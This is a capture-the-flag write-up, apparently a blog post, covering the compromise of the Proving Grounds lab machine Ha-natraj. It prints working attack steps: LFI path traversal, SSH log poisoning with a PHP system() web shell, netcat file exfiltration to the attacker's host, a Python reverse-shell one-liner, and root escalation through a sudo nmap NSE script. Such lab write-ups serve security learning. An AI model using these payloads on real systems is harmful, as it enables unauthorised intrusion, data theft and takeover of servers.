---
title: "Proving grounds Play: Ha-natraj"
layout: post
date: 2023-09-30 02:00
categories: writeup
---

Proving grounds Play - Ha-natraj CTF writeup.

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d99fdaf42e670192d5da7f70d006b392 (RSA)
|   256 bceaf13bfa7c050c929592e9e7d20771 (ECDSA)
|_  256 f0245b7a3bd6b794c44bfe5721f80061 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA:Natraj
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp - open  http - Apache httpd 2.4.29 ((Ubuntu))

![img](/assets/images/CTF/Proving_Grounds/Ha-natraj/web.png)

## Directory Fuzzing

```text
http://192.168.151.80/console/
http://192.168.151.80/console/file.php
```
![img](/assets/images/CTF/Proving_Grounds/Ha-natraj/dir.png)

## LFI Vulnerability

![img](/assets/images/CTF/Proving_Grounds/Ha-natraj/lfi.png)

## LFI to SSH Log Poisoning

![img](/assets/images/CTF/Proving_Grounds/Ha-natraj/ssh-log1.png)

**Log Poisoning**

```sh
naveenj@hackerspace:|03:07|~/pg-play/Ha-natraj$ nc -nv 192.168.151.80  22
(UNKNOWN) [192.168.151.80] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
naveenj/<?php system($_GET['cmd']); ?>
Protocol mismatch.
```

### Log File

```sh
naveenj@hackerspace:|03:08|~/pg-play/Ha-natraj$ curl "http://192.168.151.80/console/file.php?file=../../../../../../../../../../var/log/auth.log&cmd=whoami"
#auth log
Sep 30 00:07:56 ubuntu sshd[24168]: Bad protocol version identification 'naveenj/www-data' from 192.168.45.204 port 53234 #whoami execution
Sep 30 00:08:01 ubuntu CRON[24169]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 30 00:08:01 ubuntu CRON[24169]: pam_unix(cron:session): session closed for user root
```

## Initial Foothold

![img](/assets/images/CTF/Proving_Grounds/Ha-natraj/rce.png)

## Privilege Escalation

Enumerate user executable permissions.

```sh
www-data@ubuntu:/var/www/html/console$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/systemctl start apache2
    (ALL) NOPASSWD: /bin/systemctl stop apache2
    (ALL) NOPASSWD: /bin/systemctl restart apache2
www-data@ubuntu:/var/www/html/console$ 
```

List permissions for `/apache2` folder.

```sh
www-data@ubuntu:/var/www/html/console$ cd /etc/apache2
cd /etc/apache2
www-data@ubuntu:/etc/apache2$ ls -al
ls -al
total 88
drwxr-xr-x  8 root root  4096 Jun  3  2020 .
drwxr-xr-x 79 root root  4096 Sep  2  2020 ..
-rwxrwxrwx  1 root root  7224 Mar 13  2020 apache2.conf
drwxr-xr-x  2 root root  4096 Jun  3  2020 conf-available
drwxr-xr-x  2 root root  4096 Jun  3  2020 conf-enabled
-rw-r--r--  1 root root  1782 Jul 16  2019 envvars
-rw-r--r--  1 root root 31063 Jul 16  2019 magic
drwxr-xr-x  2 root root 12288 Jun  3  2020 mods-available
drwxr-xr-x  2 root root  4096 Jun  3  2020 mods-enabled
-rw-r--r--  1 root root   320 Jul 16  2019 ports.conf
drwxr-xr-x  2 root root  4096 Jun  3  2020 sites-available
drwxr-xr-x  2 root root  4096 Jun  3  2020 sites-enabled
www-data@ubuntu:/etc/apache2$ 
```

Change the user configuration of the `apache2.conf` file from `www-data` to the actual system user so when we restart the service we will obtain shell as actual system user.

Check users in the system.

```sh
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```

Transfer the apache config file to local machine to make the changes using netcat.

Send file.

```sh
www-data@ubuntu:/etc/apache2$ nc 192.168.45.204 1233 < apache2.conf #send
nc 192.168.45.204 1233 < apache2.conf
www-data@ubuntu:/etc/apache2$
```
Receive file.

```sh
naveenj@hackerspace:|03:14|~/pg-play/Ha-natraj/files$ nc -lvnp 1233 >apache2.conf   #receive
listening on [any] 1233 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.151.80] 47786
```

Do the below changes to the config file.

```conf
#old config
# These need to be set in /etc/apache2/envvars
- User ${APACHE_RUN_USER}
- Group ${APACHE_RUN_GROUP}

#new config
# These need to be set in /etc/apache2/envvars
+ User mahakal
+ Group mahakal
```

Now download the changed config file back to the `/etc/apache2/` folder as `apache2.conf` and restart the apache server.

```sh
www-data@ubuntu:/etc/apache2$ sudo /bin/systemctl restart apache2
sudo /bin/systemctl restart apache2
```

Now run the netcat listener and  obtain the shell, since the apache2 serve is running as `mahakal` the shell for the user will be obtained.

**Reverse Shell Trigger**

```text
http://192.168.151.80/console/file.php?file=../../../../../../../../../../var/log/auth.log&cmd=python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.45.204",1234))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'
```

**User: mahakal**

```sh
listening on [any] 1234 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.151.80] 49014
mahakal@ubuntu:/var/www/html/console$ 
```

Enumerate user executable permissions.

```sh
mahakal@ubuntu:/var/www/html/console$ sudo -l
sudo -l
Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap  #user can run nmap as root
mahakal@ubuntu:/var/www/html/console$
```

**Exploitation**

Create a nmap `.nse` script to spawn `/bin/bash` as below and execute it.

```sh
mahakal@ubuntu:/tmp$ echo 'os.execute("/bin/bash")' > script.nse

echo 'os.execute("/bin/bash")' > script.nse
mahakal@ubuntu:/tmp$ 
mahakal@ubuntu:/tmp$ sudo /usr/bin/nmap --script=script.nse
sudo /usr/bin/nmap --script=script.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-30 00:22 PDT
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/tmp# 
```

**Root Obtained**

Thanks for reading!

For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).